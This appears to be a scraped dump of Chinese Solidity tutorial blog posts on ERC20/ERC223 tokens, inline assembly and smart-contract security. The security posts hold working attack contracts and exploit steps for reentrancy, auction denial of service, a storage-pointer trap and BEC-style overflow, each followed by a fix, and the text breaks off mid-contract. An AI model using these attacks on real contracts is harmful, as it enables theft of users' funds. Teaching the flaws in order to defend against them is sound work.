balances[0x6AFe57C1F589C4744ab9FF4ac8899080695a6f5e] = _totalSupply; Transfer(address(0), 0x6AFe57C1F589C4744ab9FF4ac8899080695a6f5e, _totalSupply); &#125; // ------------------------------------------------------------------------ // 总供应量 // ------------------------------------------------------------------------ function totalSupply() public constant returns (uint) &#123; return _totalSupply - balances[address(0)]; &#125; // ------------------------------------------------------------------------ // 得到资金的数量 // ------------------------------------------------------------------------ function balanceOf(address tokenOwner) public constant returns (uint balance) &#123; return balances[tokenOwner]; &#125; // ------------------------------------------------------------------------ // 转账从代币拥有者的账户到其他账户 // - 所有者的账户必须有充足的资金去转账 // - 0值的转账也是被允许的 // ------------------------------------------------------------------------ function transfer(address to, uint tokens) public returns (bool success) &#123; balances[msg.sender] = safeSub(balances[msg.sender], tokens); balances[to] = safeAdd(balances[to], tokens); Transfer(msg.sender, to, tokens); return true; &#125; // ------------------------------------------------------------------------ // 授权 // ------------------------------------------------------------------------ function approve(address spender, uint tokens) public returns (bool success) &#123; allowed[msg.sender][spender] = tokens; Approval(msg.sender, spender, tokens); return true; &#125; // ------------------------------------------------------------------------ // 和approve连接在一起 // // The calling account must already have sufficient tokens approve(...)-d // for spending from the from account and // - From account must have sufficient balance to transfer // - Spender must have sufficient allowance to transfer // - 0 value transfers are allowed // ------------------------------------------------------------------------ function transferFrom(address from, address to, uint tokens) public returns (bool success) &#123; balances[from] = safeSub(balances[from], tokens); allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens); balances[to] = safeAdd(balances[to], tokens); Transfer(from, to, tokens); return true; &#125; // ------------------------------------------------------------------------ // 返回授权数量 // ------------------------------------------------------------------------ function allowance(address tokenOwner, address spender) public constant returns (uint remaining) &#123; return allowed[tokenOwner][spender]; &#125; // ------------------------------------------------------------------------ // 合约不接受以太币 // ------------------------------------------------------------------------ function () public payable &#123; revert(); &#125; // ------------------------------------------------------------------------ // Owner can transfer out any accidentally sent ERC20 tokens //所有者能够转移任何ERC20代币的接口 // ------------------------------------------------------------------------ function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) &#123; return ERC20Interface(tokenAddress).transfer(owner, tokens); &#125;&#125; ERC20代币的缺陷 1、当为合约转移了一笔钱的时候，这笔钱就会永久的消失。因为合约不能够自己去执行转账、提钱的操作。 如下面一些ERC20代币因为误操作带来的损失。 12345678910111213QTUM, $1,204,273 lost. watch on EtherscanEOS, $1,015,131 lost. watch on EtherscanGNT, $249,627 lost. watch on EtherscanSTORJ, $217,477 lost. watch on EtherscanTronix , $201,232 lost. watch on EtherscanDGD, $151,826 lost. watch on EtherscanOMG, $149,941 lost. watch on Etherscan ERC223代币引入 ERC223协议正是为了解决ERC20代币所带来的缺陷而设计的。 ERC223代币仍然可以给某一个合约转账，但是其必须要实现方法： function tokenFallback(address _from, uint _value, bytes data) ERC223代币还有一个重要的特征就是需要识别一个账户地址，其是外部账户还是合约账户。 内联汇编判断账户地址类型 12345678function isContract(address _addr) returns (bool is_contract) &#123; uint length; assembly &#123; length := extcodesize(_addr) &#125; return (length&gt;0); &#125; ERC223代币+ERC20代币 erc223协议有许多和erc20协议相同的方法，在下面我们将实现一个继承了ERC20、ERC223接口的代币合约 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150pragma solidity ^0.4.23;import \"./safemathlibrary.sol\";interface ERC20Interface &#123; //总发行数量 function totalSupply() external returns (uint); //查询数量 function balanceOf(address tokenOwner) external returns (uint balance); //查询授权数量 function allowance(address tokenOwner, address spender) external returns (uint remaining); //转账 function transfer(address to, uint tokens) external returns (bool success); //授权 function approve(address spender, uint tokens) external returns (bool success); //授权转账 function transferFrom(address from, address to, uint tokens) external returns (bool success); event Transfer(address indexed from, address indexed to, uint tokens); event Approval(address indexed tokenOwner, address indexed spender, uint tokens);&#125; interface ContractReceiver &#123; function tokenFallback(address _from, uint _value, bytes _data);&#125;interface ERC223 &#123; //可以发动给合约。 function transfer(address to, uint value, bytes data) public returns (bool ok); event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);&#125;contract Owned &#123; address public owner; address public newOwner; event OwnershipTransferred(address indexed _from, address indexed _to); constructor() public &#123; owner = msg.sender; &#125; modifier onlyOwner &#123; require(msg.sender == owner); _; &#125; function transferOwnership(address _newOwner) public onlyOwner &#123; newOwner = _newOwner; &#125; function acceptOwnership() public &#123; require(msg.sender == newOwner); emit OwnershipTransferred(owner, newOwner); owner = newOwner; newOwner = address(0); &#125;&#125;contract LoveToken is ERC20Interface,ERC223,Owned &#123; using SafeMath for uint; string public symbol; string public name; uint8 public decimals; uint _totalSupply; mapping(address =&gt; uint) balances; mapping(address =&gt; mapping(address =&gt; uint)) allowed;// A ---&gt;B 5 token constructor() public &#123; symbol=\"LOVE\"; name=\"LOVE TOKEN\"; decimals=18; _totalSupply = 10000 * 10 **18; balances[owner] = _totalSupply; emit Transfer(address(0),owner,_totalSupply); &#125; function isContract(address _addr) returns (bool is_contract) &#123; uint length; assembly &#123; length := extcodesize(_addr) &#125; return (length&gt;0); &#125; function totalSupply() public view returns (uint) &#123; return _totalSupply.sub(balances[address(0)]); &#125; function balanceOf(address tokenOwner) public view returns (uint balance) &#123; return balances[tokenOwner]; &#125; function transfer(address to, uint tokens) public returns (bool success) &#123; balances[msg.sender] = balances[msg.sender].sub(tokens); balances[to] = balances[to].add(tokens); emit Transfer(msg.sender,to,tokens); return true; &#125;//转账给合约function transfer(address to, uint value, bytes data) public returns (bool ok)&#123; if(isContract(to))&#123; balances[msg.sender] = balances[msg.sender].sub(value); balances[to] = balances[to].add(value); ContractReceiver c = ContractReceiver(to); c.tokenFallback(msg.sender,value,data); emit Transfer(msg.sender,to,value,data); &#125;&#125; function approve(address spender, uint tokens) public returns (bool success) &#123; allowed[msg.sender][spender] = tokens; emit Approval(msg.sender,spender,tokens); return true; &#125; function transferFrom(address from, address to, uint tokens) public returns (bool success) &#123; balances[from] = balances[from].sub(tokens); allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens); balances[to] = balances[to].add(tokens); emit Transfer(from,to,tokens); return true; &#125; function allowance(address tokenOwner, address spender) public view returns (uint remaining) &#123; return allowed[tokenOwner][spender]; &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[54]-安全—取反","slug":"solidity-54-negation","date":"2018-11-25T11:46:57.000Z","updated":"2018-11-27T15:31:56.725Z","comments":true,"path":"2018/11/25/solidity-54-negation/","link":"","permalink":"https://dreamerjonson.com/2018/11/25/solidity-54-negation/","excerpt":"","text":"相反数 有符号的solidity整数类型如果有N位。那么其值的范围是-2^(N-1) to 2^(N-1)-1。 这意味着该类型负数的最大值取相反数之后不能够被接收。 相反数陷阱 如下的Negation合约说明了负数在面临取相反数操作时可能遇到的问题。由于对于负数取相反数。实则是取负数的补码操作。因此、当某int类型最大的负数取相反数的时候，会是其本身。如当int8的最大值-128传递到negate8执行取反操作的时候，会返回128。 123456789101112131415contract Negation &#123; function negate8(int8 _i) public pure returns(int8) &#123; return -_i; &#125; function negate16(int16 _i) public pure returns(int16) &#123; return -_i; &#125; int8 public d = negate8(127); // -127 int8 public a = negate8(-128); // -128 int16 public b = negate16(-128); // 128 int16 public c = negate16(-32768); // -32768&#125; 解决办法 1、使用更大的类型来接收可以避免出现问题。 2、检查是否达到了该类型的最大负数。","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[53]-安全-重入攻击","slug":"solidity-53-security-reentrancy","date":"2018-11-25T03:53:03.000Z","updated":"2018-11-27T15:31:52.557Z","comments":true,"path":"2018/11/25/solidity-53-security-reentrancy/","link":"","permalink":"https://dreamerjonson.com/2018/11/25/solidity-53-security-reentrancy/","excerpt":"","text":"重入攻击 当调用外部的合约时，外部合约会接管控制流程，从而可能给自己的数据带来意想不到的修改。2016年6月，以太坊最大众筹项目The DAO被攻击，黑客获得超过350万个以太币。正是由于此陷阱。 重入攻击本质 1、调用外部合约 2、fallback回调函数被多次执行 3、逻辑顺序出现问题 4、call函数没有gaslimit的限制。 5、call函数返回值为true或false。出错不会执行回滚。 案例剖析 1、部署合约Vulnerable、Malicious、transferEther，假设地址为 addrA、addrB、addrC 2、 将addrB传递到 Vulnerable合约的 add中。 完成此操作后，将balance映射的金额增加100。附带5 ether。让Vulnerable合约一开始就有5 ether。 3、将addrA的地址传递到Malicious合约的instance中，存储地址。 4、调用transferEther合约的test方法，传递addrB的地址。由于合约的转账方法出发了fallback回调函数。因此执行了Vulnerable合约中的withdrawEquity方法。此方法执行了语句 msg.sender.call.value(x)();而当前的msg.sender为Malicious合约地址，又会再次执行Malicious合约的回调函数。而这时， ____balanceOf[msg.sender] 的金额还没有变为0.使得Vulnerable不停的转移资金给Malicious合约。一直到到达了gaslimit的限制从而终止。但是由于call函数返回值为true或false。只有最后的函数出错会执行回滚。其他函数会正常的执行。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455contract Vulnerable&#123; mapping(address =&gt;uint) public _balanceOf; function withdrawEquity() public returns(bool)&#123; uint x = _balanceOf[msg.sender]; msg.sender.call.value(x)(); _balanceOf[msg.sender] = 0 ; return true; &#125; function add(address _addr) payable&#123; _balanceOf[_addr] = 100; &#125; function getBalance() returns(uint)&#123; return this.balance; &#125;&#125;contract Malicious&#123; address private _owner; Vulnerable public vul; function setInstance(address addr) public&#123; vul = Vulnerable(addr); &#125; function Malicious() public &#123; _owner = msg.sender; &#125; function () public payable&#123; vul.withdrawEquity(); &#125; function winnerWinnerChickenDinner() public&#123; _owner.transfer(this.balance); &#125; function getBalance() returns(uint)&#123; return this.balance; &#125;&#125;contract transferEther&#123; function test(address _addr) payable&#123; _addr.call.value(5 ether)(); &#125;&#125; 解决办法 1、替换顺序，这样当重复执行withdrawEquity函数时，资金已经变为了0。 1234567891011121314function withdrawEquity() public returns(bool)&#123; uint x = _balanceOf[msg.sender]; msg.sender.call.value(x)(); _balanceOf[msg.sender] = 0 ; return true;&#125;替换为：function withdrawEquity() public returns(bool)&#123; uint x = _balanceOf[msg.sender]; _balanceOf[msg.sender] = 0 ; msg.sender.call.value(x)(); return true;&#125; 2、替换为更安全的send、transfer函数 3、对于调用外部合约的时候保持警惕。","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[52]-安全-storage陷阱","slug":"solidity-52-security-storage","date":"2018-11-25T02:33:07.000Z","updated":"2018-11-27T15:31:47.750Z","comments":true,"path":"2018/11/25/solidity-52-security-storage/","link":"","permalink":"https://dreamerjonson.com/2018/11/25/solidity-52-security-storage/","excerpt":"","text":"storage陷阱 下面的合约是一个锁定金额的合约，用户将资金存储在此合约中，只有当过了一段时间时候才能够提取出来。 下面的案例是为了说明storage属性预设性带来的陷阱。payIn函数是当用户存储金额时调用的函数。传递的参数似乎解锁的时间。在合约payIn中，HoldRecord newRecord; 其实默认为storage类型，并且，当不为storage变量赋值的时候，变量默认引用的位置是storage空间中的0号位置。这也意味着在当前的案例中，newRecord指针指向了ownerAmount，当对newRecord 执行newRecord.amount += msg.value; 实则将ownerAmount即合约拥有者的金额增加了。 这时，合约拥有者就可以调用ownerWithdrawal将用户存储在合约的钱转移出来。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051pragma solidity ^0.4.23;contract HodlFraud &#123; uint public ownerAmount; //合约拥有者的金钱 uint public numberOfPayouts; //次数 address public owner; //合约的拥有者 struct HoldRecord &#123; uint amount; //存储的金钱 uint unlockTime; //解锁的时间 &#125; mapping (address =&gt; HoldRecord) public balance; //地址 =&gt; 存储的金钱，时间 //构造函数初始化 function HodlFraud () public payable &#123; owner = msg.sender; ownerAmount = msg.value; &#125; //某一个用户存储金钱， //@param holdTime 代表的是解锁时间 function payIn(uint holdTime) public payable &#123; require(msg.value &gt; 0); HoldRecord newRecord; newRecord.amount += msg.value; newRecord.unlockTime = now + holdTime; balance[msg.sender] = newRecord; &#125; //转账，使用这笔钱 function withdraw () public &#123; require(balance[msg.sender].unlockTime &lt; now &amp;&amp; balance[msg.sender].amount &gt; 0); msg.sender.transfer(balance[msg.sender].amount); balance[msg.sender].amount = 0; numberOfPayouts++; &#125; //合约的拥有着，转移自己的钱 function ownerWithdrawal () public &#123; require(msg.sender == owner &amp;&amp; ownerAmount &gt; 0); msg.sender.transfer(ownerAmount); ownerAmount = 0; &#125;&#125; 解决办法 HoldRecord newRecord 修改为 HoldRecord memory newRecord 总结 123// 这个例子是要举出在 smart contract 中 storage 预设行为的危险性。其实只要维持一个原则就可以避免这个问题。// 养成明确定义使用 storage 还是 memory 的好习惯// 一般来说，指定 storage 时就直接给初始值；而在 function 里面需要用到的缓存器都用 memory，除非想要直接修改链上的值。现在 compiler 都会很聪明的提醒开发者要定义 storage 还是 memory，而当 storage pointer 没有初始值时也会提醒开发者。","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[51]-安全—dos攻击","slug":"solidity-51-dos-attrack","date":"2018-11-24T15:50:46.000Z","updated":"2018-11-27T15:31:43.730Z","comments":true,"path":"2018/11/24/solidity-51-dos-attrack/","link":"","permalink":"https://dreamerjonson.com/2018/11/24/solidity-51-dos-attrack/","excerpt":"","text":"Dos攻击 dos攻击也叫做拒绝服务攻击，通过使程序操作无效完成攻击的目的。 下面的一段合约是2016年KotET（“纷争时代”）合约，其遭受了dos攻击。本小节将揭开此合约被攻击的秘密。 源代码 在下面KotET合约代码中，模拟了争夺皇位的功能。只有出价最高的人才能够夺得桂冠。 合约中的bid方法正是最核心的竞价合约。只有当msg.value即附带的以太币大于当前最大的出价人，就会首先将从前的最高价格转移给从前的出价人。完成之后，新的价格和资金会替换掉旧的资金。 123456789101112131415pragma solidity ^0.4.23;contract Auction&#123; address public currentLeader; //当前最高出价人 uint256 public highestBid; //当前最高价格 mapping(address=&gt;uint) balance; //资金表 //竞价合约 function bid() public payable&#123; require(msg.value &gt;highestBid); require(currentLeader.send(highestBid)); currentLeader = msg.sender; highestBid= msg.value; &#125;&#125; 攻击合约 下面是黑客攻击的合约。攻击手法为：首先部署POC合约。假设为0x3456 将Auction合约的地址传递给setInstance，构建auInstance接口实例。从而能够在外部调用合约。执行attack方法，附带以太坊，例如100wei。假设还没有进行过拍卖，那么当前的最高出价地址为当前合约，最高价格为100wei。假设有另外一个人想争夺皇位，其出价了200wei 调用了Auction合约的bid方法。虽然其价格最高，但是这笔操作不能成功。原因就在于currentLeader.send(highestBid)转账，如果是合约地址，会调用合约中自定义的回调函数，而在当前案例中的回调函数，revert()意味着操作回滚，不成功。因此始终没有办法将钱还给合约，此合约将霸占王位。 123456789101112131415161718192021222324252627282930pragma solidity ^0.4.23;interface Auction&#123; function bid() external payable;&#125;contract POC&#123; address owner; Auction auInstance; constructor() public&#123; owner = msg.sender; &#125; modifier onlyOwner()&#123; require(owner==msg.sender); _; &#125; function setInstance(address addr) public onlyOwner&#123; auInstance = Auction(addr); &#125; function attack() public payable onlyOwner&#123; auInstance.bid.value(msg.value)(); &#125; function() external payable&#123; revert(); &#125;&#125; 解决办法 让用户自己去取钱，而不是自动的转移资金到失败者的账户中。 123456789101112131415161718192021pragma solidity ^0.4.23;contract Auction&#123; address public currentLeader; uint256 public highestBid; //存储金额 mapping(address=&gt;uint) public balance; function bid() public payable&#123; require(msg.value &gt;highestBid); balance[currentLeader] = highestBid; currentLeader = msg.sender; highestBid= msg.value; &#125; //用户提钱 function withdraw() public&#123; require(balance[msg.sender]!=0); msg.sender.transfer(balance[msg.sender]); balance[msg.sender] = 0; &#125;&#125; dos攻击案例2 dos攻击的第二个例子是，谨慎的使用循环。 如下，refundAll方法为动态数组refundAddresses中每一个账户转移资金。由于refundAddresses长度不确定。一旦超过了以太坊gaslimit的限制，就会导致这笔操作不能够成功。 对可以被外部用户人为操纵的数据结构进行批量操作，建议使用取回模式而不是发送模式，每个投资者可以使用withdrawFunds取回自己应得的代币。 如果实在必须通过遍历一个变长数组来进行转账，最好估计完成它们大概需要多少个区块以及多少笔交易。 下面合约的第二个错误在于，一旦某一个账户转账不成功，就会导致所以交易回滚，全部失败。 123456789address[] private refundAddresses;mapping (address =&gt; uint) public refunds;function refundAll() public &#123; for(uint x; x &lt; refundAddresses.length; x++) &#123; require(refundAddresses[x].send(refunds[refundAddresses[x]])) &#125;&#125; 参考资料 https://consensys.github.io","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[50]-assembly内联汇编","slug":"solidity-50-assembly","date":"2018-11-24T04:23:28.000Z","updated":"2018-11-27T15:31:39.724Z","comments":true,"path":"2018/11/24/solidity-50-assembly/","link":"","permalink":"https://dreamerjonson.com/2018/11/24/solidity-50-assembly/","excerpt":"","text":"内联汇编 对于普通的solidity智能合约来说，通过solc编译器的优化操作，将源代码转换为以太坊能够识别的二进制文件。但是solc编译器不是万能的，在某些情况下，例如循环操作的时候，并不能达到最佳的执行方式。通过在solidity智能合约中内嵌汇编代码，可以阻止编译器的优化，在某些时候能够到达节约gas的作用。同时，内嵌汇编代码可以增加solidity语言的功能。例如在判断账户地址为合约地址还是外部地址的时候，只能够通过汇编代码来实现。 内联汇编语法 123assembly&#123; 内联汇编语句&#125; 将for循环转换变为内联汇编 let指令定义变量。 add函数是内联汇编中内置的加法操作，solidity内联汇编中有很多内置的函数。jumpi为跳转函数，跳转到loop语句执行。 It函数为小于函数，lt(i,9)判断i是否小于9 12345678910111213141516171819function nativeLoop() public returns(uint _r)&#123; for(uint i = 0;i&lt;10;i++)&#123; _r += i; &#125; &#125; function asmloop() public returns(uint _r)&#123; assembly&#123; let i :=0 loop: i:=add(i,1) _r := add(_r,i) jumpi(loop,lt(i,9)) &#125; &#125; 条件语句转换为内联汇编 1234567891011121314151617181920212223242526272829function nativeConditional(uint _v) returns(uint _r)&#123; if(5==_v)&#123; _r = 55; &#125; else if(6 ==_v)&#123; _r = 66; &#125; _r = 11;&#125;function asmConditional(uint _v) public returns(uint _r)&#123; assembly&#123; switch _v case 5&#123; _r:=55 &#125; case 6&#123; _r:=66 &#125; default&#123; _r:=11 &#125; &#125;&#125; 内联汇编解析1 下面的合约中，msize()代表的是当前已经使用的memory空间的最大位置。加1之后，代表的是可用的指针所在的位置。 mstore代表将值_v赋值给_ptr。 return (ptr,0x20)代表的是从位置_ptr开始，往下读取0x20也就是32个字节 1234567function asmReturens(uint _v) public returns(uint)&#123; assembly&#123; let _ptr :=add(msize(),1) mstore(_ptr,_v) return (_ptr,0x20) &#125; &#125; 内联汇编解析2 mload（40）代表获取0x40位置往下32个字节存储的数据。0x40位置非常特殊，其存储的是最小的可用的memory内存的地址。 例如为0x80. mstore(add(freemem_pointer,0x00),“36e5236fcd4c610449678014f0d085”) 存储字符串到&quot;36e5236fcd4c610449678014f0d085&quot; 到0x80往下32个字节的空间中。 mstore(add(freemem_pointer,0x20),“36e5236fcd4c610449678014f0d086”) 首先将0x80加上32个字节，变为了0xa0。之后便加上32个字节，存储字符串&quot;36e5236fcd4c610449678014f0d086&quot; 到0xa0往下32个字节的空间中。 let arr1:=mload(freemem_pointer)定义了变量arr1. 获取freemem_pointer往下32个字节。由于freemem_pointer当前仍然为0x80，因此arr1的值为字符串&quot;36e5236fcd4c610449678014f0d085&quot;。 最后的语句mstore(add(freemem_pointer,0x40),arr1)。存储了arr1到0xc0地址往下的32个字节的空间中。 12345678910111213141516pragma solidity ^0.4.23;contract cat&#123; function test()&#123; assembly&#123; let freemem_pointer :=mload(0x40) //0x80 mstore(add(freemem_pointer,0x00),\"36e5236fcd4c610449678014f0d085\") mstore(add(freemem_pointer,0x20),\"36e5236fcd4c610449678014f0d086\") let arr1:=mload(freemem_pointer) mstore(add(freemem_pointer,0x40),arr1) &#125; &#125;&#125; 内联汇编解析3 下面的函数，实现了将地址转换为动态字节数组的操作。 let m := mload(0x40)获取0x40位置往下32个字节存储的数据。0x40位置非常特殊，其存储的是最小的可用的memory内存的地址。例如为0x80. add(m, 20) 将0x80加上了20个字节(0x14)，到达0x94. xor为位运算的异或操作。相等为0，不等为1。0x140000000000000000000000000000000000000000的长度为168位，币地址多了6位。假设地址为0xca35b7d915458ef540ade6068dfe2f44e8fa733c。那么异或之后，变为了0x14ca35b7d915458ef540ade6068dfe2f44e8fa733c，一共有21个字节。填充为32个字节之后变为了0x000000000000000000000014ca35b7d915458ef540ade6068dfe2f44e8fa733c，通过mstore存储到0x94地址之后的32个字节中。 在memory空间中 0x80 0x0000000000000000000000000000000000000000000000000000000000000014 0xa0 0xca35b7d915458ef540ade6068dfe2f44e8fa733c000000000000000000000000 从而14代表长度为20个字节。其后面是地址。将0x80的地址赋值给动态长度字节变量b。由于动态长度字节数组首先32个字节存储长度，后面存储内容。因此将地址转换为了动态长度数组。 1234567891011contract dog&#123; function toBytes(address a) constant returns (bytes b)&#123; assembly &#123; let m := mload(0x40) mstore(add(m, 20), xor(0x140000000000000000000000000000000000000000, a)) mstore(0x40, add(m, 52)) b := m &#125;&#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[49]-安全-溢出攻击","slug":"solidity-49-overflow","date":"2018-11-24T00:58:48.000Z","updated":"2018-11-26T08:35:31.801Z","comments":true,"path":"2018/11/24/solidity-49-overflow/","link":"","permalink":"https://dreamerjonson.com/2018/11/24/solidity-49-overflow/","excerpt":"","text":"攻击回顾 12345672016年6月，以太坊最大众筹项目The DAO被攻击，黑客获得超过350万个以太币，最终导致以太坊分叉为ETH和ETC。2016年拒绝服务攻击：GovernMental&apos;s 1100 ETH2016年KotET（“纷争时代”）合约遭受攻击。2017年Parity钱包,遭受delecate call注入,销毁了合约。损失513,774.16 Ether2017年ANT Token遭受重入漏洞。2017年Simoleon合约被攻击。黑客通过部署攻击合约获得了超过700万的token，从57万账户中脱颖而出，一举成为该合约token的第四大持有者。2018年BEC代币遭到袭击，攻击手法被披露的24小时内，就有30多个合约遭受攻击 溢出 孔子曾经说过 过犹不及。做事情都有限度，一旦超过了限度就会适得其反。理解溢出问题最好的是在千禧之年爆发的千年虫事件。过去，由于计算机程序中使用两个数字来表示年份，如1998年被表示为“98”、1999年被表示为“99”；而2000年被表示为“00”，这样将会导致某些程序在计算时得到不正确的结果，如把“00”误解为1900年。在嵌入式系统中可能存在同样的问题，这有可能导致设备停止运转或者发生更加灾难性的后果。 solidity中的溢出问题 下面是一个简单的函数，其功能是将桉树加1.例如传递4，返回5。传递200，返回201。但是里面暗藏着陷阱。例如当传递255的时候，会返回0…这就是溢出。这是由于uint8的最大值为255，在内存中：为1111 1111。一旦加1之后，变为了 1 0000 0000,但是最大的位数为8位。截断之后，变为了0000 0000 因此返回的结果为0。 123function add(uint8 a) public pure returns(uint8)&#123; return a+1;&#125; safeMath避免溢出问题 因此我们可以看到，对于4则运算，很容易的发生溢出问题。OpenZeppelin 建立了一个叫做 SafeMath 的 库。这就规避掉溢出问题。 123456789101112131415161718library SafeMath &#123; function add(uint a, uint b) internal pure returns (uint c) &#123; c = a + b; require(c &gt;= a); &#125; function sub(uint a, uint b) internal pure returns (uint c) &#123; require(b &lt;= a); c = a - b; &#125; function mul(uint a, uint b) internal pure returns (uint c) &#123; c = a * b; require(a == 0 || c / a == b); &#125; function div(uint a, uint b) internal pure returns (uint c) &#123; require(b &gt; 0); c = a / b; &#125;&#125; BEC代币攻击全纪实 如下为BEC代币的源代码抽离出来的部分。2018年4月份BEC代币遭到黑客的溢出袭击。黑客为自己的两个账号转移了2^255次方的代币。导致市场的恐慌，币价一度一文不值。攻击手法被披露的24小时内，就有类似30多个合约遭受攻击 在TokenExample合约中，有一个batchTransfer函数。此函数的功能为对账户进行转账操作。第一个参数为动态长度地址，明确要转账的账户。第二个参数为转账的金额。 要转账成功，必须要保证在balance资金表中，发送者必须有超过总金额(账户数量转账金额)。但是 uint256 amount = uint256(cnt) value;这段代码并没有做安全的乘法，导致可能会发生溢出攻击。当黑客调用合约的时候，在remix中： 输入地址数组以及：[“0xb4D30Cac5124b46C2Df0CF3e3e1Be05f42119033”,“0x0e823fFE018727585EaF5Bc769Fa80472F76C3d7”]， 以及 value&quot;0x8000000000000000000000000000000000000000000000000000000000000000&quot;即2*255， 使得amount=2^255 * 2,超出uint256类型的范围[0,2**256-1]，溢出为0，发送者账户余额不减少，并且，本例中，发送者的代币可以为零，实现&quot;无中生有&quot;。 123456789101112131415161718192021222324252627282930313233343536373839library SafeMath&#123; function sub(uint256 a,uint256 b) internal pure returns(uint256)&#123; assert(b&lt;=a); return a-b; &#125; function add(uint256 a,uint256 b) internal pure returns(uint256 c)&#123; c=a+b; assert(c&gt;=a); return c; &#125;&#125;contract TokenExample&#123; //使用safemath库 using SafeMath for uint256; //资金表 mapping(address=&gt;uint256) public balance; function batchTransfer(address[] _receivers,uint256 _value) public returns(bool)&#123; //要转移的地址的数量 uint cnt = _receivers.length; //转账总金额 uint256 amount = uint256(cnt)*_value; //判断转账地址必须大于0 require(cnt &gt;0 &amp;&amp; cnt &lt;=20); //判断发送者拥有的金额必须大于转账的总金额 require(_value &gt;0 &amp;&amp; balance[msg.sender]&gt;=amount); //发送者账户金额减少 20 balance[msg.sender] = balance[msg.sender].sub(amount); //接受者金额增加 10 for(uint i =0 ;i&lt;cnt;i++)&#123; balance[_receivers[i]] = balance[_receivers[i]].add(_value); &#125; return true; &#125;&#125; 减法溢出案例 调用distribute函数，传入地址数组： [“0x14723a09acff6d2a60dcdf7aa4aff308fddc160c”,“0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db”] owner分别向这两个地址发送2000 * 108代币，超过owner余额，balances[owner]产生减法溢出；查询owner账户余额，等于2256-2000*10**8 12345678910111213141516171819202122232425contract TokenExample&#123; address public owner; mapping(address =&gt;uint256) public balances; mapping(address =&gt;mapping(address=&gt;uint256)) public allowed; event Transfer(address _from,address _to,uint256 _value); modifier onlyOwner&#123; require(msg.sender==owner); _; &#125; constructor() public &#123; owner = msg.sender; balances[owner] = 2000*10**8; &#125; function distribute(address[] addresses) public onlyOwner&#123; for(uint i =0;i&lt;addresses.length;i++)&#123; balances[owner] -=2000*10**8; balances[addresses[i]] +=2000*10**8; emit Transfer(owner,addresses[i],2000*10**8); &#125; &#125;&#125; 加法溢出 1、部署合约； 2、向target预先转一部分代币，模拟目标账户中已有的代币：调用transfer函数，传入target地址： 0x14723a09acff6d2a60dcdf7aa4aff308fddc160c， 以及转账额度，比如： 2000000000000000000（2 * 10**uint256(decimals)）; 3、如果owner想控制target的余额减半，那么，他只需要向target增发 2*256-balanceOf[target]+10*18=0xfffffffffffffffffffffffffffffffffffffffffffffffff21f494c589c0000， 现在调用mintToken函数，向target地址转入上述数量的代币： 4、查询target余额 1234567891011121314151617181920212223242526272829303132333435contract TokenExample&#123; address public owner; mapping(address=&gt;uint256) public balanceOf; uint256 public totalSupply; uint8 public decimals = 18; event Transfer(address _from,address _to,uint256 _value); modifier onlyOwner&#123; require(msg.sender==owner); _; &#125; constructor() public&#123; owner = msg.sender; totalSupply = 2000 * 10**uint256(decimals); balanceOf[owner] = totalSupply; &#125; function transfer(address _to,uint256 _value) public returns(bool success)&#123; require(balanceOf[msg.sender] &gt;=_value); require(balanceOf[_to] +_value &gt;=balanceOf[_to]); balanceOf[msg.sender] -= _value; balanceOf[_to] +=_value; emit Transfer(msg.sender,_to,_value); return true; &#125; function mintToken(address target,uint256 mintedAmount) public onlyOwner&#123; balanceOf[target] +=mintedAmount; 